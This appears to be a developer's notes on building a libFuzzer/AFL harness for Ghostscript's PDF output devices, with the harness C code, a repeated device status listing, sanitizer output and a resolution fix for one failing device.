    "inferno","lp8800c","hl1250","tiffg3","bmp16","urf","lp1800","epl2050",
    "plibm","pr1000","lex2050","cdj550","pcxmono","md5k","hpdjplus","alc8500",
    "ink_cov","lp8900","hl7x0","tiffg32d","bmp16m","ijs","lp1900","epl2050p",
    "pnm","pr1000_4","lex3200","cdj670","pdfimage24","mj500c","hpdjportable","alc8600",
    "inkcov","lp9000b","hpdj1120c","tiffg4","bmp256","png16","lp2000","epl2120",
    "pnmraw","pr150","lex5700","cdj850","pdfimage32","mj6000c","ibmpro","alc9100",
    "jpeg","lp9000c","hpdj310","tiffgray","bmp32b","png16m","lp2200","epl2500",
    "ppm","pr201","lex7000","cdj880","pdfimage8","mj700v2c","imagen","ap3250",
    "jpegcmyk","lp9100","hpdj320","tifflzw","bmpgray","png16malpha","lp2400","epl2750",
    "ppmraw","bbox","pxlcolor","lips2p","cdj890","pgm","mj8000c","itk24i",
    "appledmp","jpeggray","lp9200b","hpdj340","tiffpack","bmpmono","png256","lp2500",
    "epl5800","pppm","x11","pxlmono","lips3","cdj970","pgmraw","ml600",
    "itk38","atx23","mgr4","lp9200c","hpdj400","tiffscaled","bmpsep1","png48",
    "lp2563","epl5900","ps2write","x11alpha","r4081","lips4","cdjcolor","pgnm",
    "necp6","iwhi","atx24","mgr8","lp9300","hpdj500","tiffscaled24","bmpsep8",
    "pngalpha","lp3000c","epl6100","psdcmyk","x11cmyk","rinkj","lips4v","cdjmono",
    "pgnmraw","npdl","iwhic","atx38","mgrgray2","lp9400","hpdj500c","tiffscaled32",
    "ccr","pnggray","lp7500","epl6200","psdcmyk16","x11cmyk2","rpdl","lj250",
    "cdnj500","pkm","oce9050","iwlo","bj10e","mgrgray4","lp9500c","hpdj510",
    "tiffscaled4","cfax","pngmono","lp7700","eplcolor","psdcmykog","x11cmyk4","samsunggdi",
    "lj3100sw","chp2200","pkmraw","oki182","iwlow","bj10v","mgrgray8","lp9600",
    "hpdj520","tiffscaled8","cif","pngmonod","lp7900","eplmono","psdcmyktags","x11cmyk8",
    "sj48","lj4dith","cljet5","pksm","oki4w","iwlq","bj10vh","mgrmono",
    "lp9600s","hpdj540","tiffsep","devicen","ocr","lp8000","eps9high","psdcmyktags16",
    "x11gray2","st800","lj4dithp","cljet5c","pksmraw","okiibm","iwlqc","bj200",
    "miff24"
};

int n_devices = 369; // The number of devices...

int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) {
    /* Bail early if the header isn't present */
    if (size < 4) return 0;

    /* Consume option bytes. */
    uint8_t  color_byte  = data[0];
    uint8_t  interp_byte = data[1];
    uint16_t dev_word    = (uint16_t)data[2] | ((uint16_t)data[3] << 8);  /* LE */

    /* Map to params */
    int color_scheme     = (int)(color_byte % 63);     /* [0..62] */
    int do_interpolation = (interp_byte != 0);         /* any nonzero -> true */

    /* Use the 16-bit device index (modulo the number of compiled-in devices) */
    int dev_index = (int)(dev_word % n_devices);       /* n_devices = array length */
    const char *device_target = devices[dev_index];

    /* The rest is the PDF payload */
    const uint8_t *pdf_data = data + 4;
    size_t         pdf_size = size - 4;

    /* Always write to /dev/null. */
    (void)fuzz_gs_device(pdf_data, pdf_size,
                         color_scheme,
                         device_target,
                         "/dev/null",
                         do_interpolation);
    return 0;
}



#ifdef USE_AFL

__AFL_FUZZ_INIT();

int main(int argc, char **argv) {
    // LLVMFuzzerInitialize(&argc, &argv); // No initializati
    __AFL_INIT();
    const uint8_t *buf = __AFL_FUZZ_TESTCASE_BUF;
    while (__AFL_LOOP(100000)) {
        int len = __AFL_FUZZ_TESTCASE_LEN;
        LLVMFuzzerTestOneInput(buf, (size_t)len);
    }
    return 0;
}





#endif

```

and it compiles.

I am going to investigate the devices and see what is wrong with it...

Here is the current device list:

```
oof@elskun-lppri:~/ghostscript_mutator/pdf_fuzzing$ cat newest_device_output.txt | grep "\->"
[  0] lp9800c         -> OK
[  1] hpdj550c        -> UNKNOWN (string)
[  2] tiffsep1        -> OK
[  3] dfaxhigh        -> OK
[  4] hocr            -> UNKNOWN (string)
[  5] lp8000c         -> OK
[  6] eps9mid         -> OK
[  7] psdrgb          -> OK
[  8] x11gray4        -> OK
[  9] stcolor         -> OK
[ 10] lj5gray         -> OK
[ 11] cljet5pr        -> OK
[ 12] plan            -> OK
[ 13] oprp            -> UNKNOWN (string)
[ 14] jetp3852        -> OK
[ 15] bjc600          -> OK
[ 16] pam             -> OK
[ 17] lps4500         -> OK
[ 18] hpdj560c        -> UNKNOWN (string)
[ 19] txtwrite        -> OK
[ 20] dfaxlow         -> OK
[ 21] pdfocr8         -> OK
[ 22] lp8100          -> OK
[ 23] epson           -> OK
[ 24] psdrgb16        -> OK
[ 25] x11mono         -> OK
[ 26] t4693d2         -> OK
[ 27] lj5mono         -> OK
[ 28] coslw2p         -> OK
[ 29] plan9bm         -> OK
[ 30] opvp            -> UNKNOWN (string)
[ 31] jj100           -> OK
[ 32] bjc800          -> OK
[ 33] pamcmyk32       -> OK
[ 34] lps6500         -> OK
[ 35] hpdj600         -> UNKNOWN (string)
[ 36] urfcmyk         -> OK
[ 37] display         -> UNKNOWN (string)
[ 38] pdfocr24        -> OK
[ 39] lp8200c         -> OK
[ 40] epsonc          -> OK
[ 41] psdrgbtags      -> OK
[ 42] x11rg16x        -> OK
[ 43] t4693d4         -> OK
[ 44] ljet2p          -> OK
[ 45] coslwxl         -> OK
[ 46] planc           -> OK
[ 47] paintjet        -> OK
[ 48] la50            -> OK
[ 49] bjc880j         -> OK
[ 50] pamcmyk4        -> OK
[ 51] lq850           -> OK
[ 52] hpdj660c        -> UNKNOWN (string)
[ 53] urfgray         -> OK
[ 54] docxwrite       -> OK
[ 55] pdfocr32        -> OK
[ 56] lp8300c         -> OK
[ 57] escp            -> OK
[ 58] spotcmyk        -> OK
[ 59] x11rg32x        -> OK
[ 60] t4693d8         -> OK
[ 61] ljet3           -> OK
[ 62] declj250        -> OK
[ 63] plang           -> OK
[ 64] pcl3            -> OK
[ 65] la70            -> OK
[ 66] bjccmyk         -> OK
[ 67] pbm             -> OK
[ 68] lxm3200         -> OK
[ 69] hpdj670c        -> UNKNOWN (string)
[ 70] urfrgb          -> OK
[ 71] eps2write       -> OK
[ 72] nullpage        -> OK
[ 73] lp8300f         -> OK
[ 74] escpage         -> OK
[ 75] tiff12nc        -> OK
[ 76] pclm            -> OK
[ 77] tek4696         -> OK
[ 78] ljet3d          -> OK
[ 79] deskjet         -> OK
[ 80] plank           -> OK
[ 81] photoex         -> OK
[ 82] la75            -> OK
[ 83] bjccolor        -> OK
[ 84] pbmraw          -> OK
[ 85] lxm5700m        -> OK
[ 86] hpdj680c        -> UNKNOWN (string)
[ 87] xcf             -> OK
[ 88] pdfwrite        -> OK
[ 89] lp8400f         -> OK
[ 90] fmlbp           -> OK
[ 91] tiff24nc        -> OK
[ 92] pclm8           -> OK
[ 93] uniprint        -> OK
[ 94] ljet4           -> OK
[ 95] dj505j          -> OK
[ 96] planm           -> OK
[ 97] picty180        -> OK
[ 98] la75plus        -> OK
[ 99] bjcgray         -> OK
[100] pcx16           -> OK
[101] m8510           -> OK
[102] hpdj690c        -> UNKNOWN (string)
[103] xpswrite        -> OK
[104] faxg3           -> OK
[105] lp8500c         -> OK
[106] fmpr            -> OK
[107] tiff32nc        -> OK
[108] bit             -> OK
[109] xes             -> OK
[110] ljet4d          -> OK
[111] djet500         -> OK
[112] plib            -> UNKNOWN (string)
[113] pj              -> OK
[114] laserjet        -> OK
[115] bjcmono         -> OK
[116] pcx24b          -> OK
[117] md1xMono        -> UNKNOWN (string)
[118] hpdj850c        -> UNKNOWN (string)
[119] alc1900         -> OK
[120] faxg32d         -> OK
[121] lp8600          -> OK
[122] fs600           -> OK
[123] tiff48nc        -> OK
[124] bitcmyk         -> OK
[125] appleraster     -> OK
[126] ljet4pjl        -> OK
[127] djet500c        -> OK
[128] plibc           -> UNKNOWN (string)
[129] pjetxl          -> OK
[130] lbp310          -> OK
[131] cdeskjet        -> OK
[132] pcx256          -> OK
[133] md2k            -> UNKNOWN (string)
[134] hpdj855c        -> UNKNOWN (string)
[135] alc2000         -> OK
[136] faxg4           -> OK
[137] lp8600f         -> OK
[138] gdi             -> OK
[139] tiff64nc        -> OK
[140] bitrgb          -> OK
[141] cups            -> OK
[142] ljetplus        -> OK
[143] dl2100          -> OK
[144] plibg           -> UNKNOWN (string)
[145] pjxl            -> OK
[146] lbp320          -> OK
[147] cdj1600         -> OK
[148] pcxcmyk         -> OK
[149] md50Eco         -> UNKNOWN (string)
[150] hpdj870c        -> UNKNOWN (string)
[151] alc4000         -> OK
[152] fpng            -> OK
[153] lp8700          -> OK
[154] hl1240          -> OK
[155] tiffcrle        -> OK
[156] bitrgbtags      -> OK
[157] pwgraster       -> OK
[158] ln03            -> OK
[159] dnj650c         -> OK
[160] plibk           -> UNKNOWN (string)
[161] pjxl300         -> OK
[162] lbp8            -> OK
[163] cdj500          -> OK
[164] pcxgray         -> OK
[165] md50Mono        -> UNKNOWN (string)
[166] hpdj890c        -> UNKNOWN (string)
[167] alc4100         -> OK
[168] inferno         -> OK
[169] lp8800c         -> OK
[170] hl1250          -> OK
[171] tiffg3          -> OK
[172] bmp16           -> OK
[173] urf             -> OK
[174] lp1800          -> OK
[175] epl2050         -> OK
[176] plibm           -> UNKNOWN (string)
[177] pr1000          -> OK
[178] lex2050         -> OK
[179] cdj550          -> OK
[180] pcxmono         -> OK
[181] md5k            -> UNKNOWN (string)
[182] hpdjplus        -> UNKNOWN (string)
[183] alc8500         -> OK
[184] ink_cov         -> OK
[185] lp8900          -> OK
[186] hl7x0           -> OK
[187] tiffg32d        -> OK
[188] bmp16m          -> OK
[189] ijs             -> UNKNOWN (string)
[190] lp1900          -> OK
[191] epl2050p        -> OK
[192] pnm             -> OK
[193] pr1000_4        -> OK
[194] lex3200         -> OK
[195] cdj670          -> OK
[196] pdfimage24      -> OK
[197] mj500c          -> UNKNOWN (string)
[198] hpdjportable    -> UNKNOWN (string)
[199] alc8600         -> OK
[200] inkcov          -> OK
[201] lp9000b         -> OK
[202] hpdj1120c       -> UNKNOWN (string)
[203] tiffg4          -> OK
[204] bmp256          -> OK
[205] png16           -> OK
[206] lp2000          -> OK
[207] epl2120         -> OK
[208] pnmraw          -> OK
[209] pr150           -> OK
[210] lex5700         -> OK
[211] cdj850          -> OK
[212] pdfimage32      -> OK
[213] mj6000c         -> UNKNOWN (string)
[214] ibmpro          -> OK
[215] alc9100         -> OK
[216] jpeg            -> OK
[217] lp9000c         -> OK
[218] hpdj310         -> UNKNOWN (string)
[219] tiffgray        -> OK
[220] bmp32b          -> OK
[221] png16m          -> OK
[222] lp2200          -> OK
[223] epl2500         -> OK
[224] ppm             -> OK
[225] pr201           -> OK
[226] lex7000         -> OK
[227] cdj880          -> OK
[228] pdfimage8       -> OK
[229] mj700v2c        -> UNKNOWN (string)
[230] imagen          -> OK
[231] ap3250          -> OK
[232] jpegcmyk        -> OK
[233] lp9100          -> OK
[234] hpdj320         -> UNKNOWN (string)
[235] tifflzw         -> OK
[236] bmpgray         -> OK
[237] png16malpha     -> UNKNOWN (string)
[238] lp2400          -> OK
[239] epl2750         -> OK
[240] ppmraw          -> OK
[241] bbox            -> OK
[242] pxlcolor        -> OK
[243] lips2p          -> UNKNOWN (string)
[244] cdj890          -> OK
[245] pgm             -> OK
[246] mj8000c         -> UNKNOWN (string)
[247] itk24i          -> OK
[248] appledmp        -> ERR 241
[249] jpeggray        -> OK
[250] lp9200b         -> OK
[251] hpdj340         -> UNKNOWN (string)
[252] tiffpack        -> OK
[253] bmpmono         -> OK
[254] png256          -> OK
[255] lp2500          -> OK
[256] epl5800         -> OK
[257] pppm            -> OK
[258] x11             -> OK
[259] pxlmono         -> OK
[260] lips3           -> UNKNOWN (string)
[261] cdj970          -> OK
[262] pgmraw          -> OK
[263] ml600           -> OK
[264] itk38           -> OK
[265] atx23           -> OK
[266] mgr4            -> OK
[267] lp9200c         -> OK
[268] hpdj400         -> UNKNOWN (string)
[269] tiffscaled      -> OK
[270] bmpsep1         -> OK
[271] png48           -> OK
[272] lp2563          -> OK
[273] epl5900         -> OK
[274] ps2write        -> OK
[275] x11alpha        -> OK
[276] r4081           -> OK
[277] lips4           -> OK
[278] cdjcolor        -> OK
[279] pgnm            -> OK
[280] necp6           -> OK
[281] iwhi            -> ERR 241
[282] atx24           -> OK
[283] mgr8            -> OK
[284] lp9300          -> OK
[285] hpdj500         -> UNKNOWN (string)
[286] tiffscaled24    -> OK
[287] bmpsep8         -> OK
[288] pngalpha        -> UNKNOWN (string)
[289] lp3000c         -> OK
[290] epl6100         -> OK
[291] psdcmyk         -> OK
[292] x11cmyk         -> OK
[293] rinkj           -> OK
[294] lips4v          -> OK
[295] cdjmono         -> OK
[296] pgnmraw         -> OK
[297] npdl            -> OK
[298] iwhic           -> ERR 241
[299] atx38           -> OK
[300] mgrgray2        -> OK
[301] lp9400          -> OK
[302] hpdj500c        -> UNKNOWN (string)
[303] tiffscaled32    -> OK
[304] ccr             -> OK
[305] pnggray         -> OK
[306] lp7500          -> OK
[307] epl6200         -> OK
[308] psdcmyk16       -> OK
[309] x11cmyk2        -> OK
[310] rpdl            -> UNKNOWN (string)
[311] lj250           -> OK
[312] cdnj500         -> OK
[313] pkm             -> OK
[314] oce9050         -> OK
[315] iwlo            -> ERR 241
[316] bj10e           -> OK
[317] mgrgray4        -> OK
[318] lp9500c         -> OK
[319] hpdj510         -> UNKNOWN (string)
[320] tiffscaled4     -> OK
[321] cfax            -> OK
[322] pngmono         -> OK
[323] lp7700          -> OK
[324] eplcolor        -> OK
[325] psdcmykog       -> OK
[326] x11cmyk4        -> OK
[327] samsunggdi      -> OK
[328] lj3100sw        -> OK
[329] chp2200         -> OK
[330] pkmraw          -> OK
[331] oki182          -> OK
[332] iwlow           -> ERR 241
[333] bj10v           -> OK
[334] mgrgray8        -> OK
[335] lp9600          -> OK
[336] hpdj520         -> UNKNOWN (string)
[337] tiffscaled8     -> OK
[338] cif             -> OK
[339] pngmonod        -> UNKNOWN (string)
[340] lp7900          -> OK
[341] eplmono         -> OK
[342] psdcmyktags     -> OK
[343] x11cmyk8        -> OK
[344] sj48            -> OK
[345] lj4dith         -> OK
[346] cljet5          -> OK
[347] pksm            -> OK
[348] oki4w           -> OK
[349] iwlq            -> ERR 241
[350] bj10vh          -> OK
[351] mgrmono         -> OK
[352] lp9600s         -> OK
[353] hpdj540         -> UNKNOWN (string)
[354] tiffsep         -> OK
[355] devicen         -> OK
[356] ocr             -> UNKNOWN (string)
[357] lp8000          -> OK
[358] eps9high        -> OK
[359] psdcmyktags16   -> OK
[360] x11gray2        -> OK
[361] st800           -> OK
[362] lj4dithp        -> OK
[363] cljet5c         -> OK
[364] pksmraw         -> OK
[365] okiibm          -> ERR 1
[366] iwlqc           -> ERR 241
[367] bj200           -> OK
[368] miff24          -> OK
oof@elskun-lppri:~/ghostscript_mutator/pdf_fuzzing$
```

## Fixing output device problems

So I ran the script and now I have this output here:

```
[  0] lp9800c         -> OK
[  1] hpdj550c        -> UNKNOWN (string)
[  2] tiffsep1        -> OK
[  3] dfaxhigh        -> OK
[  4] hocr            -> UNKNOWN (string)
[  5] lp8000c         -> OK
[  6] eps9mid         -> OK
[  7] psdrgb          -> OK
[  8] x11gray4        -> OK
[  9] stcolor         -> OK
[ 10] lj5gray         -> OK
[ 11] cljet5pr        -> OK
[ 12] plan            -> OK
[ 13] oprp            -> UNKNOWN (string)
[ 14] jetp3852        -> OK
[ 15] bjc600          -> OK
[ 16] pam             -> OK
[ 17] lps4500         -> OK
[ 18] hpdj560c        -> UNKNOWN (string)
[ 19] txtwrite        -> OK
[ 20] dfaxlow         -> OK
[ 21] pdfocr8         -> OK
[ 22] lp8100          -> OK
[ 23] epson           -> OK
[ 24] psdrgb16        -> OK
[ 25] x11mono         -> OK
[ 26] t4693d2         -> OK
[ 27] lj5mono         -> OK
[ 28] coslw2p         -> OK
[ 29] plan9bm         -> OK
[ 30] opvp            -> UNKNOWN (string)
[ 31] jj100           -> OK
[ 32] bjc800          -> OK
[ 33] pamcmyk32       -> OK
[ 34] lps6500         -> OK
[ 35] hpdj600         -> UNKNOWN (string)
[ 36] urfcmyk         -> OK
[ 37] display         -> UNKNOWN (string)
[ 38] pdfocr24        -> OK
[ 39] lp8200c         -> OK
[ 40] epsonc          -> OK
[ 41] psdrgbtags      -> OK
[ 42] x11rg16x        -> OK
[ 43] t4693d4         -> OK
[ 44] ljet2p          -> OK
[ 45] coslwxl         -> OK
[ 46] planc           -> OK
[ 47] paintjet        -> OK
[ 48] la50            -> OK
[ 49] bjc880j         -> OK
[ 50] pamcmyk4        -> OK
[ 51] lq850           -> OK
[ 52] hpdj660c        -> UNKNOWN (string)
[ 53] urfgray         -> OK
[ 54] docxwrite       -> OK
[ 55] pdfocr32        -> OK
[ 56] lp8300c         -> OK
[ 57] escp            -> OK
[ 58] spotcmyk        -> OK
[ 59] x11rg32x        -> OK
[ 60] t4693d8         -> OK
[ 61] ljet3           -> OK
[ 62] declj250        -> OK
[ 63] plang           -> OK
[ 64] pcl3            -> OK
[ 65] la70            -> OK
[ 66] bjccmyk         -> OK
[ 67] pbm             -> OK
[ 68] lxm3200         -> OK
[ 69] hpdj670c        -> UNKNOWN (string)
[ 70] urfrgb          -> OK
[ 71] eps2write       -> OK
[ 72] nullpage        -> OK
[ 73] lp8300f         -> OK
[ 74] escpage         -> OK
[ 75] tiff12nc        -> OK
[ 76] pclm            -> OK
[ 77] tek4696         -> OK
[ 78] ljet3d          -> OK
[ 79] deskjet         -> OK
[ 80] plank           -> OK
[ 81] photoex         -> OK
[ 82] la75            -> OK
[ 83] bjccolor        -> OK
[ 84] pbmraw          -> OK
[ 85] lxm5700m        -> OK
[ 86] hpdj680c        -> UNKNOWN (string)
[ 87] xcf             -> OK
[ 88] pdfwrite        -> OK
[ 89] lp8400f         -> OK
[ 90] fmlbp           -> OK
[ 91] tiff24nc        -> OK
[ 92] pclm8           -> OK
[ 93] uniprint        -> OK
[ 94] ljet4           -> OK
[ 95] dj505j          -> OK
[ 96] planm           -> OK
[ 97] picty180        -> OK
[ 98] la75plus        -> OK
[ 99] bjcgray         -> OK
[100] pcx16           -> OK
[101] m8510           -> OK
[102] hpdj690c        -> UNKNOWN (string)
[103] xpswrite        -> OK
[104] faxg3           -> OK
[105] lp8500c         -> OK
[106] fmpr            -> OK
[107] tiff32nc        -> OK
[108] bit             -> OK
[109] xes             -> OK
[110] ljet4d          -> OK
[111] djet500         -> OK
[112] plib            -> UNKNOWN (string)
[113] pj              -> OK
[114] laserjet        -> OK
[115] bjcmono         -> OK
[116] pcx24b          -> OK
[117] md1xMono        -> UNKNOWN (string)
[118] hpdj850c        -> UNKNOWN (string)
[119] alc1900         -> OK
[120] faxg32d         -> OK
[121] lp8600          -> OK
[122] fs600           -> OK
[123] tiff48nc        -> OK
[124] bitcmyk         -> OK
[125] appleraster     -> OK
[126] ljet4pjl        -> OK
[127] djet500c        -> OK
[128] plibc           -> UNKNOWN (string)
[129] pjetxl          -> OK
[130] lbp310          -> OK
[131] cdeskjet        -> OK
[132] pcx256          -> OK
[133] md2k            -> UNKNOWN (string)
[134] hpdj855c        -> UNKNOWN (string)
[135] alc2000         -> OK
[136] faxg4           -> OK
[137] lp8600f         -> OK
[138] gdi             -> OK
[139] tiff64nc        -> OK
[140] bitrgb          -> OK
[141] cups            -> OK
[142] ljetplus        -> OK
[143] dl2100          -> OK
[144] plibg           -> UNKNOWN (string)
[145] pjxl            -> OK
[146] lbp320          -> OK
[147] cdj1600         -> OK
[148] pcxcmyk         -> OK
[149] md50Eco         -> UNKNOWN (string)
[150] hpdj870c        -> UNKNOWN (string)
[151] alc4000         -> OK
[152] fpng            -> OK
[153] lp8700          -> OK
[154] hl1240          -> OK
[155] tiffcrle        -> OK
[156] bitrgbtags      -> OK
[157] pwgraster       -> OK
[158] ln03            -> OK
[159] dnj650c         -> OK
[160] plibk           -> UNKNOWN (string)
[161] pjxl300         -> OK
[162] lbp8            -> OK
[163] cdj500          -> OK
[164] pcxgray         -> OK
[165] md50Mono        -> UNKNOWN (string)
[166] hpdj890c        -> UNKNOWN (string)
[167] alc4100         -> OK
[168] inferno         -> OK
[169] lp8800c         -> OK
[170] hl1250          -> OK
[171] tiffg3          -> OK
[172] bmp16           -> OK
[173] urf             -> OK
[174] lp1800          -> OK
[175] epl2050         -> OK
[176] plibm           -> UNKNOWN (string)
[177] pr1000          -> OK
[178] lex2050         -> OK
[179] cdj550          -> OK
[180] pcxmono         -> OK
[181] md5k            -> UNKNOWN (string)
[182] hpdjplus        -> UNKNOWN (string)
[183] alc8500         -> OK
[184] ink_cov         -> OK
[185] lp8900          -> OK
[186] hl7x0           -> OK
[187] tiffg32d        -> OK
[188] bmp16m          -> OK
[189] ijs             -> UNKNOWN (string)
[190] lp1900          -> OK
[191] epl2050p        -> OK
[192] pnm             -> OK
[193] pr1000_4        -> OK
[194] lex3200         -> OK
[195] cdj670          -> OK
[196] pdfimage24      -> OK
[197] mj500c          -> UNKNOWN (string)
[198] hpdjportable    -> UNKNOWN (string)
[199] alc8600         -> OK
[200] inkcov          -> OK
[201] lp9000b         -> OK
[202] hpdj1120c       -> UNKNOWN (string)
[203] tiffg4          -> OK
[204] bmp256          -> OK
[205] png16           -> OK
[206] lp2000          -> OK
[207] epl2120         -> OK
[208] pnmraw          -> OK
[209] pr150           -> OK
[210] lex5700         -> OK
[211] cdj850          -> OK
[212] pdfimage32      -> OK
[213] mj6000c         -> UNKNOWN (string)
[214] ibmpro          -> OK
[215] alc9100         -> OK
[216] jpeg            -> OK
[217] lp9000c         -> OK
[218] hpdj310         -> UNKNOWN (string)
[219] tiffgray        -> OK
[220] bmp32b          -> OK
[221] png16m          -> OK
[222] lp2200          -> OK
[223] epl2500         -> OK
[224] ppm             -> OK
[225] pr201           -> OK
[226] lex7000         -> OK
[227] cdj880          -> OK
[228] pdfimage8       -> OK
[229] mj700v2c        -> UNKNOWN (string)
[230] imagen          -> OK
[231] ap3250          -> OK
[232] jpegcmyk        -> OK
[233] lp9100          -> OK
[234] hpdj320         -> UNKNOWN (string)
[235] tifflzw         -> OK
[236] bmpgray         -> OK
[237] png16malpha     -> UNKNOWN (string)
[238] lp2400          -> OK
[239] epl2750         -> OK
[240] ppmraw          -> OK
[241] bbox            -> OK
[242] pxlcolor        -> OK
[243] lips2p          -> UNKNOWN (string)
[244] cdj890          -> OK
[245] pgm             -> OK
[246] mj8000c         -> UNKNOWN (string)
[247] itk24i          -> OK
[248] appledmp        -> ERR 241
[249] jpeggray        -> OK
[250] lp9200b         -> OK
[251] hpdj340         -> UNKNOWN (string)
[252] tiffpack        -> OK
[253] bmpmono         -> OK
[254] png256          -> OK
[255] lp2500          -> OK
[256] epl5800         -> OK
[257] pppm            -> OK
[258] x11             -> OK
[259] pxlmono         -> OK
[260] lips3           -> UNKNOWN (string)
[261] cdj970          -> OK
[262] pgmraw          -> OK
[263] ml600           -> OK
[264] itk38           -> OK
[265] atx23           -> OK
[266] mgr4            -> OK
[267] lp9200c         -> OK
[268] hpdj400         -> UNKNOWN (string)
[269] tiffscaled      -> OK
[270] bmpsep1         -> OK
[271] png48           -> OK
[272] lp2563          -> OK
[273] epl5900         -> OK
[274] ps2write        -> OK
[275] x11alpha        -> OK
[276] r4081           -> OK
[277] lips4           -> OK
[278] cdjcolor        -> OK
[279] pgnm            -> OK
[280] necp6           -> OK
[281] iwhi            -> ERR 241
[282] atx24           -> OK
[283] mgr8            -> OK
[284] lp9300          -> OK
[285] hpdj500         -> UNKNOWN (string)
[286] tiffscaled24    -> OK
[287] bmpsep8         -> OK
[288] pngalpha        -> UNKNOWN (string)
[289] lp3000c         -> OK
[290] epl6100         -> OK
[291] psdcmyk         -> OK
[292] x11cmyk         -> OK
[293] rinkj           -> OK
[294] lips4v          -> OK
[295] cdjmono         -> OK
[296] pgnmraw         -> OK
[297] npdl            -> OK
[298] iwhic           -> ERR 241
[299] atx38           -> OK
[300] mgrgray2        -> OK
[301] lp9400          -> OK
[302] hpdj500c        -> UNKNOWN (string)
[303] tiffscaled32    -> OK
[304] ccr             -> OK
[305] pnggray         -> OK
[306] lp7500          -> OK
[307] epl6200         -> OK
[308] psdcmyk16       -> OK
[309] x11cmyk2        -> OK
[310] rpdl            -> UNKNOWN (string)
[311] lj250           -> OK
[312] cdnj500         -> OK
[313] pkm             -> OK
[314] oce9050         -> OK
[315] iwlo            -> ERR 241
[316] bj10e           -> OK
[317] mgrgray4        -> OK
[318] lp9500c         -> OK
[319] hpdj510         -> UNKNOWN (string)
[320] tiffscaled4     -> OK
[321] cfax            -> OK
[322] pngmono         -> OK
[323] lp7700          -> OK
[324] eplcolor        -> OK
[325] psdcmykog       -> OK
[326] x11cmyk4        -> OK
[327] samsunggdi      -> OK
[328] lj3100sw        -> OK
[329] chp2200         -> OK
[330] pkmraw          -> OK
[331] oki182          -> OK
[332] iwlow           -> ERR 241
[333] bj10v           -> OK
[334] mgrgray8        -> OK
[335] lp9600          -> OK
[336] hpdj520         -> UNKNOWN (string)
[337] tiffscaled8     -> OK
[338] cif             -> OK
[339] pngmonod        -> UNKNOWN (string)
[340] lp7900          -> OK
[341] eplmono         -> OK
[342] psdcmyktags     -> OK
[343] x11cmyk8        -> OK
[344] sj48            -> OK
[345] lj4dith         -> OK
[346] cljet5          -> OK
[347] pksm            -> OK
[348] oki4w           -> OK
[349] iwlq            -> ERR 241
[350] bj10vh          -> OK
[351] mgrmono         -> OK
[352] lp9600s         -> OK
[353] hpdj540         -> UNKNOWN (string)
[354] tiffsep         -> OK
[355] devicen         -> OK
[356] ocr             -> UNKNOWN (string)
[357] lp8000          -> OK
[358] eps9high        -> OK
[359] psdcmyktags16   -> OK
[360] x11gray2        -> OK
[361] st800           -> OK
[362] lj4dithp        -> OK
[363] cljet5c         -> OK
[364] pksmraw         -> OK
[365] okiibm          -> ERR 1
[366] iwlqc           -> ERR 241
[367] bj200           -> OK
[368] miff24          -> OK
```

so we essentially have to go through each of these and try to solve the problems in each of the failing output devices. Usually the error occurs because that output device needs a specific command line parameter to work and I do not have that.

Here is an example:

```
oof@elskun-lppri:~/ghostpdlafl$ ./debug_fuzzer md1xMono < sample_pdf/sample.pdf
base/scommon.h:127:31: runtime error: index -1 out of bounds for type 'byte[1]' (aka 'unsigned char[1]')
SUMMARY: UndefinedBehaviorSanitizer: undefined-behavior base/scommon.h:127:31
base/scommon.h:141:31: runtime error: index -1 out of bounds for type 'byte[1]' (aka 'unsigned char[1]')
SUMMARY: UndefinedBehaviorSanitizer: undefined-behavior base/scommon.h:141:31
psi/interp.c:1156:13: runtime error: member access within null pointer of type 'ref' (aka 'struct ref_s')
SUMMARY: UndefinedBehaviorSanitizer: undefined-behavior psi/interp.c:1156:13
psi/interp.c:1156:13: runtime error: member access within null pointer of type 'struct tas_s'
SUMMARY: UndefinedBehaviorSanitizer: undefined-behavior psi/interp.c:1156:13
psi/interp.c:1434:21: runtime error: member access within null pointer of type 'ref' (aka 'struct ref_s')
SUMMARY: UndefinedBehaviorSanitizer: undefined-behavior psi/interp.c:1434:21
psi/interp.c:1434:21: runtime error: member access within null pointer of type 'struct tas_s'
SUMMARY: UndefinedBehaviorSanitizer: undefined-behavior psi/interp.c:1434:21
GPL Ghostscript GIT PRERELEASE 10.06.0 (2025-04-29)
Copyright (C) 2025 Artifex Software, Inc.  All rights reserved.
This software is supplied under the GNU AGPLv3 and comes with NO WARRANTY:
see the file COPYING for details.
base/gsicc_manage.c:2188:23: runtime error: member access within null pointer of type 'cmm_profile_t' (aka 'struct cmm_profile_s')
SUMMARY: UndefinedBehaviorSanitizer: undefined-behavior base/gsicc_manage.c:2188:23
GPL Ghostscript GIT PRERELEASE 10.06.0: device must have an X resolution of 600dpi
**** Unable to open the initial device, quitting.
gsapi_init_with_args: error -100
base/fapi_ft.c:1950:43: runtime error: member access within null pointer of type 'struct FT_OutlineGlyphRec_'
SUMMARY: UndefinedBehaviorSanitizer: undefined-behavior base/fapi_ft.c:1950:43
base/fapi_ft.c:1951:42: runtime error: member access within null pointer of type 'struct FT_BitmapGlyphRec_'
SUMMARY: UndefinedBehaviorSanitizer: undefined-behavior base/fapi_ft.c:1951:42
oof@elskun-lppri:~/ghostpdlafl$
```

so this is fixed, by just adding `-r600x600` to the command line. I had 200x200 by default. I should probably make an override function which overwrites the command line parameters and it checks that output device...

I now have this here:

```
#include <stddef.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>

#include "psi/iapi.h"
#include "psi/interp.h"
#include "psi/iminst.h"
#include "base/gserrors.h"

#include <signal.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <time.h>

#include <pthread.h>
#include <stdatomic.h>
#include <limits.h>

static const unsigned char *g_data;
static size_t g_size;



#define min(x, y) ((x) < (y) ? (x) : (y))

static int gs_stdin(void *inst, char *buf, int len)
{
    size_t to_copy = min(len, g_size);
    to_copy = min(INT_MAX, to_copy);

    memcpy(buf, g_data, to_copy);

    g_data += to_copy;
    g_size -= to_copy;

    return to_copy;
}

static int gs_stdnull(void *inst, const char *buf, int len)
{

    /* Just discard everything. */
    // return len;


    int written = fwrite(buf, 1, len, stdout);
    fflush(stdout);  // flush immediately if you want streaming behavior
    return written;

}

/* Return a pointer to the device name inside args (after -sDEVICE=),
   or NULL if not present. */
static const char *extract_device_from_args(char *const *args, int argc) {
    for (int i = 0; i < argc; ++i) {
        const char *a = args[i];
        if (!a) continue;
        if (strncmp(a, "-sDEVICE=", 9) == 0) {
            return a + 9; // after '='
        }
    }
    return NULL;
}

